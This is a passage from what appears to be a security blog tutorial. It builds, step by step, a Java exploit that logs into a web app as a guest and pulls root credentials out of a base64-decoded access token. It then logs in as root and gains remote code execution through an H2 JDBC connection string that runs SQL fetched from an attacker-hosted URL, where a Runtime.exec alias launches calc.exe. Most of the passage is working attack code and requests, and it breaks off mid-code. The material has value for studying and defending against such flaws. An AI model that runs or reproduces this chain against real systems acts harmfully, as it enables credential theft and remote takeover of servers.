&lt;p&gt;But, This time we will add a one more step that will allow us to achieve code execution on the target server, By performing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JDBC Attack&lt;/code&gt; you could read more about it from &lt;a href=&quot;https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;login-with-the-low-privileged-account&quot;&gt;&lt;strong&gt;Login with the low-privileged account&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;So, First we need to perform a login request with the low-privileged account provided by the user. So, what do we need here ?:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;take input from user which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The login request and it’s form is as the following:&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Login request:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api/login HTTP/1.1
Host: 192.168.0.162:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Access-Token: 
Content-Length: 39
Origin: http://192.168.0.162:8888
DNT: 1
Connection: close
Referer: http://192.168.0.162:8888/

{&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the request is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/login&lt;/code&gt; endpoint made to the host of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.0.162&lt;/code&gt; and port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8888&lt;/code&gt;. So, we first need from the user a host and port of the server where the application is running. along with the username and password that we would use for authentication.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import java.net.URL;
import java.net.HttpURLConnection;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws Exception {
        Scanner scanner = new Scanner(System.in);
        System.out.print(&quot;[+] Enter host: &quot;);
        String host = scanner.nextLine();
        System.out.print(&quot;[+] Enter port: &quot;);
        String port = scanner.nextLine();
        System.out.print(&quot;[+] Enter username: &quot;);
        String username = scanner.nextLine();
        System.out.print(&quot;[+] Enter password: &quot;);
        String password = scanner.nextLine();
        scanner.close();
        String url = &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/api/login&quot;;
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod(&quot;POST&quot;);
        con.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
        con.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
        con.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
        con.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
        con.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
        con.setRequestProperty(&quot;Access-Token&quot;, &quot;&quot;);
        con.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
        con.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
        con.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
        con.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
        String body = &quot;{\&quot;username\&quot;:\&quot;&quot; + username + &quot;\&quot;,\&quot;password\&quot;:\&quot;&quot; + password + &quot;\&quot;}&quot;;
        con.setDoOutput(true);
        con.getOutputStream().write(body.getBytes(&quot;UTF-8&quot;));
        int responseCode = con.getResponseCode();
        System.out.println(&quot;[*] Response Code: &quot; + responseCode);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we imported the needed libraries from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.net&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.util&lt;/code&gt; and then read the input of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt; from the user using then closed the scanner object we created:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Scanner scanner = new Scanner(System.in);
System.out.print(&quot;[+] Enter host: &quot;);
String host = scanner.nextLine();
System.out.print(&quot;[+] Enter port: &quot;);
String port = scanner.nextLine();
System.out.print(&quot;[+] Enter username: &quot;);
String username = scanner.nextLine();
System.out.print(&quot;[+] Enter password: &quot;);
String password = scanner.nextLine();
scanner.close();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that we created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; object to handle the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; for login endpoint inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;obj&lt;/code&gt;, Then we created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Http&lt;/code&gt; connection to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; object and assign the connection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;con&lt;/code&gt; which is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Http&lt;/code&gt; connection object:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;String url = &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/api/login&quot;;
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the coming lines, We set the request method and the headers needed for the request through the methods under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;con&lt;/code&gt; object:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;con.setRequestMethod(&quot;POST&quot;);
con.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
con.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
con.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
con.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
con.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
con.setRequestProperty(&quot;Access-Token&quot;, &quot;&quot;);
con.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
con.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
con.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
con.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, We created the request body and pass the user input to it and pass it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;con&lt;/code&gt; Http object to be included in the request &amp;amp; after that to print us the Response status code:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;con.setDoOutput(true);
con.getOutputStream().write(body.getBytes(&quot;UTF-8&quot;));
int responseCode = con.getResponseCode();
System.out.println(&quot;[*] Response Code: &quot; + responseCode);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, It’s time to try our first step code:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/828f2427610f835ed9765a69f755244f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;As we can see our first step done successfully, Let’s move to the next step.&lt;/p&gt;

&lt;h2 id=&quot;obtain-the-accesstoken&quot;&gt;&lt;strong&gt;Obtain the accessToken&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Now, Let’s send the normal login request within burp suite repeater, We can see that the response body is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; format:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/72ad1e367cc5679ee80dbfc5daa06414&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;As we focusing here we focus on the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; key with in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; data. But, We can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; key is under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;model&lt;/code&gt; array. So, When we parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; data we will get the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;model&lt;/code&gt; array then get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; value from it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
String inputLine;
StringBuffer response = new StringBuffer();
while ((inputLine = in.readLine()) != null) {
    response.append(inputLine);
}
in.close();
JSONObject jsonObject = new JSONObject(response.toString());
JSONObject model = jsonObject.getJSONObject(&quot;model&quot;);
String accessToken = model.getString(&quot;accessToken&quot;);
System.out.println(&quot;[*] Acess Token: &quot; + accessToken);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After importing the new needed modules &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.io.BufferedReader&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.json.JSONObject&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.io.InputStreamReader&lt;/code&gt;. Here we created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BufferReader&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in&lt;/code&gt; and assign response we got from the application into it, Then we define a String named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inputLine&lt;/code&gt; to use it in our loop to store the response lines and then assign it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StringBuffer&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response&lt;/code&gt; which gonna contain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; data we want. then we closed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in&lt;/code&gt;. After that we define a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsonObject&lt;/code&gt; and store the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response&lt;/code&gt; in it as a string format, Then we created another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;model&lt;/code&gt; and store the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;model&lt;/code&gt; key from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; data in it, Finally we created a string named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; and assign the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; key inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;model&lt;/code&gt; array into it and print that value out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9d9e228c9d68a5480936b39b85728877&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here we can see, Step 2 of our exploit is done.&lt;/p&gt;

&lt;h2 id=&quot;decode-the-accesstoken&quot;&gt;&lt;strong&gt;Decode the accessToken&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;We can easily identify that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt;, So, Now we need to decode it to a normal string. And this will be done easily using the following 2 lines after importing the needed modules &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.nio.charset.StandardCharsets&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.util.Base64&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));
String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);
System.out.println(&quot;[*] Decoded Acess Token: &quot; + decodedAccessToken);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;byte&lt;/code&gt; array named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decodedBytes&lt;/code&gt; that will decode the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; value and store inside it, After that define a string named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decodedAccessToken&lt;/code&gt; that will store the bytes after converting it to a string and then will be printed out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/acb5f8074f259ba69950c679547c2f42&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here we can see see the decoded token and the 3rd step of the exploit done successfully.&lt;/p&gt;

&lt;h2 id=&quot;parse-the-decoded-data-from-the-accesstoken--retrive-root-account-credentials&quot;&gt;&lt;strong&gt;Parse the decoded data from the accessToken &amp;amp; Retrive root account credentials&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;It’s time now for step 4 &amp;amp; 5. As the decoded data from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; format. Then let’s part it and Retrieve the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account credentials.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);
String rootUsername = &quot;&quot;;
String rootPassword = &quot;&quot;;
if (decodedJsonObject.has(&quot;rootUsername&quot;) &amp;amp;&amp;amp; decodedJsonObject.has(&quot;rootPassword&quot;)) {
    rootUsername = decodedJsonObject.getString(&quot;rootUsername&quot;);
    rootPassword = decodedJsonObject.getString(&quot;rootPassword&quot;);
    System.out.println(&quot;[*] Root username: &quot; + rootUsername);
    System.out.println(&quot;[*] Root password: &quot; + rootPassword);
} else {
    System.out.println(&quot;[-] Access token does not contain rootUsername and rootPassword keys.&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decodedJsonObject&lt;/code&gt; and assign the decoded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; value to it, Then define 2 strings with empty value for username and password we will retrive later. After that we made &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt; condition to check if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; data has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootUsername&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootPassword&lt;/code&gt; keys to Retrievethe credentials from it, If it’s exist then it will assign the values to the string variables we defined early which are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootUsername&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootPassword&lt;/code&gt; after that it will print the values out, And if not found, It will print us a massege telling us it’s not found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7dfee9044aacbfe41207479c803b0cbd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here we can see our 4th &amp;amp; 5th steps done successfully.&lt;/p&gt;

&lt;h2 id=&quot;login-with-the-root-account-credentials-and-obtain-a-full-privileges-on-the-application&quot;&gt;&lt;strong&gt;Login with the&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account credentials and obtain a full privileges on the application&lt;/h2&gt;

&lt;p&gt;Now, we want to use the root credentials we obtained, To login into the application and Retrieve the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; will back with the response which is gonna be with full privileges on the application as the authentication done with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();
            con3.setRequestMethod(&quot;POST&quot;);
            con3.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;);
            con3.setRequestProperty(&quot;Accept&quot;, &quot;application/json, text/plain, */*&quot;);
            con3.setRequestProperty(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
            con3.setRequestProperty(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;);
            con3.setRequestProperty(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
            con3.setRequestProperty(&quot;Access-Token&quot;, &quot;&quot;);
            con3.setRequestProperty(&quot;Origin&quot;, &quot;http://&quot; + host + &quot;:&quot; + port);
            con3.setRequestProperty(&quot;DNT&quot;, &quot;1&quot;);
            con3.setRequestProperty(&quot;Connection&quot;, &quot;close&quot;);
            con3.setRequestProperty(&quot;Referer&quot;, &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/&quot;);
            String requestBody3 = &quot;{\&quot;username\&quot;:\&quot;&quot; + rootUsername + &quot;\&quot;,\&quot;password\&quot;:\&quot;&quot; + rootPassword + &quot;\&quot;}&quot;;
            con3.setDoOutput(true);
            con3.getOutputStream().write(requestBody3.getBytes(&quot;UTF-8&quot;));
            int responseCode3 = con3.getResponseCode();
            System.out.println(&quot;[*] Root Login Response Code: &quot; + responseCode3);
            BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));
            String inputLine3;
            StringBuffer response3 = new StringBuffer();
            while ((inputLine3 = in3.readLine()) != null) {
                response3.append(inputLine3);
            }
            in3.close();
            JSONObject jsonObject3 = new JSONObject(response3.toString());
            JSONObject model3 = jsonObject3.getJSONObject(&quot;model&quot;);
            String accessToken3 = model3.getString(&quot;accessToken&quot;);
            System.out.println(&quot;[*] Root Access Token: &quot; + accessToken3);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we created a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Http&lt;/code&gt; Object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;con3&lt;/code&gt; and used the same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; for login, In short, We copied the first login request but replaced the login credentials with the one we obtained from the first login process and parsed the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; returned as a results from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account authentication &amp;amp; Stored it in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken3&lt;/code&gt; variable and printed it out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d9105296b6f6c821f50d2df9e012139f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here as we can see it’s done successfully and Retrieved the token based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account.&lt;/p&gt;

&lt;h2 id=&quot;achieve-rce&quot;&gt;&lt;strong&gt;Achieve RCE&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Now, You may be wondering, If we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account credentials, Why we would need to Retrieve it’s token ?. So, Basically to perform a connection throug the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JDBC&lt;/code&gt; we need high-privileges and to automate this process let’s see how it works first.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dca34df301e10d7d6603820a469e99cd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see when we logged-in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt; we are not able to add any data source. But, If we login with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account. We can see that we have the privileges to add data source and test the connection&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ec2f7d061af25c788d4c7798b12f36fa&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now, Under the Event Tracer Data Source click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add&lt;/code&gt; button and add the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/668b686db6b362a05506f578236eaf4d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What did we done here?. We named Our data source, then used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;h2 driver&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2&lt;/code&gt; itself is a relational database management system, and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.h2.driver&lt;/code&gt; is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JDBC&lt;/code&gt; driver used to connect to an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2&lt;/code&gt; database from Java. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; value:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically, This is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JDBC&lt;/code&gt; connection string which will connect a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2&lt;/code&gt; in memory database with the name we give which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testdb&lt;/code&gt;. Then, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TRACE_LEVEL_SYSTEM_OUT=3&lt;/code&gt; parameter enables trace logging to be printed to the console. Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'&lt;/code&gt; parameter specifies that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.sql&lt;/code&gt; script located at our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; should be executed when the database is initialized. But, What is inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.sql&lt;/code&gt; file ?:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return &quot;123&quot;;}';CALL EXEC ('calc.exe')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In short words, This sql script uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2&lt;/code&gt; database ability to create an alias to execute command and here we executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; for the demo of the exploit. Now, Let’s start our http server that will host our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.sql&lt;/code&gt; script and after that we click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Test Connect&lt;/code&gt; Button:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/c638cbe6833b72d759916714e36b31f2&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;It’s time now to take the request of the connection and added to our exploit code.&lt;/p&gt;

&lt;p&gt;Request:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api/data-source/connectTest HTTP/1.1
Host: 192.168.0.162:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Access-Token: Root_access_token
Content-Length: 185
Origin: http://192.168.0.162:8088
DNT: 1
Connection: close
Referer: http://192.168.0.162:8088/
Cookie: JSESSIONID=C9B7BAFA141D48D0D26178AD8F489668

{&quot;name&quot;:&quot;azima&quot;,&quot;driver&quot;:&quot;org.h2.Driver&quot;,&quot;url&quot;:&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'&quot;,&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see we will create a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; connection object with a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; object for the connection request to perform the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JDBC&lt;/code&gt; Attack. So, Here we need to replace the SQL script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; with one provided by the user.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;String url2 = &quot;http://&quot; + host + &quot;:&quot; + port + &quot;/api/data-source/connectTest&quot;;
